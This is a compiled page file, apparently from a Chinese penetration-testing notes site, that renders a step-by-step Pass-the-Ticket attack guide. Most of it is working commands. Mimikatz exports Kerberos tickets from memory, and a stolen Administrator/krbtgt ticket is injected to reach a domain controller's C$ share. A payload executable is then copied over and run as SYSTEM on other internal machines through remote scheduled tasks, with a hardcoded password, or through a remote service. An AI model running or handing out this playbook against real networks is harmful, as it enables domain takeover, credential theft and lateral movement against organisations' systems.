import{_ as n,W as s,X as a,a1 as e}from"./framework-b6a07282.js";const t={},c=e(`<h2 id="票据传递攻击-ptt" tabindex="-1"><a class="header-anchor" href="#票据传递攻击-ptt" aria-hidden="true">#</a> 票据传递攻击（PTT）</h2><ul><li>票据传递攻击（Pass The Ticket），常用来做后渗透权限维持</li><li>利用内存中的高权限票据，导入内存，然后控制域控来打穿域。（黄金票据、白银票据）</li></ul><h3 id="攻击步骤" tabindex="-1"><a class="header-anchor" href="#攻击步骤" aria-hidden="true">#</a> 攻击步骤</h3><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.导出票据
mimikatz privilege::debug 
mimikatz sekurlsa::tickets /export

<span class="token number">2</span>.清除内存中的票据
shell klist
mimikatz kerberos::purge

<span class="token number">3</span>.将高权限票据注入内存
mimikatz kerberos::ptt <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">;</span>5dd4d1<span class="token punctuation">]</span>-2-1-40e10000-Administrator@krbtgt-HACKER.COM.kirbi 
mimikatz kerberos::tgt <span class="token comment">#查票</span>

<span class="token number">4</span>.访问域控
shell <span class="token function">dir</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span>controlfish<span class="token punctuation">\\</span>c$ <span class="token comment">#这里一定要计算机名或域名</span>
shell <span class="token function">dir</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span>controlfish.hacker.com<span class="token punctuation">\\</span>c$

<span class="token number">5</span>.执行各种命令
net <span class="token function">time</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4 <span class="token comment">#查看时间</span>
tasklist /s <span class="token number">192.168</span>.1.4 <span class="token comment">#查看进程</span>
<span class="token function">dir</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4<span class="token punctuation">\\</span>c$ <span class="token comment">#查看C盘</span>

<span class="token comment">#配合计划任务攻击夺取另一台内网机器的shell</span>
copy C:<span class="token punctuation">\\</span>Users<span class="token punctuation">\\</span>admin<span class="token punctuation">\\</span>Desktop<span class="token punctuation">\\</span>artifact.exe <span class="token punctuation">\\</span><span class="token punctuation">\\</span>controlfish.hacker.com<span class="token punctuation">\\</span>C$ <span class="token comment">#拷贝文件到目标主机C盘下</span>
schtasks /create /s controlfish.hacker.com /tn shellname /sc onstart /tr c:<span class="token punctuation">\\</span>artifact.exe /ru system /f
schtasks /run /s controlfish.hacker.com /i /tn <span class="token string">&quot;shellname&quot;</span>

schtasks /create /u administrator /p Aa123456 /s controlfish.hacker.com /tn shellname /sc onstart /tr c:<span class="token punctuation">\\</span>artifact.exe /ru system /f <span class="token comment">#创建计划任务</span>
schtasks /run /u administrator /p Aa123456 /s controlfish.hacker.com /i /tn <span class="token string">&quot;shellname&quot;</span> <span class="token comment">#运行计划任务</span>
schtasks /query /s controlfish.hacker.com /u administrator /p Aa123456 /TN c <span class="token comment">#查看计划任务</span>

SCHTASKS /DELETE /s controlfish.hacker.com /TN <span class="token string">&quot;shellname1&quot;</span> /f <span class="token comment">#强制删除计划任务</span>

<span class="token comment">#配合服务夺取另一台内网机器的shell</span>
sc <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4 create servername <span class="token assign-left variable">binpath</span><span class="token operator">=</span> <span class="token string">&quot;cmd.exe /c c:<span class="token entity" title="\\a">\\a</span>rtifact.exe&quot;</span> <span class="token comment">#创建服务</span>
sc <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4 start servername <span class="token comment">#启动服务</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,4),i=[c];function l(o,p){return s(),a("div",null,i)}const u=n(t,[["render",l],["__file","票据传递攻击（PTT）.html.vue"]]);export{u as default};
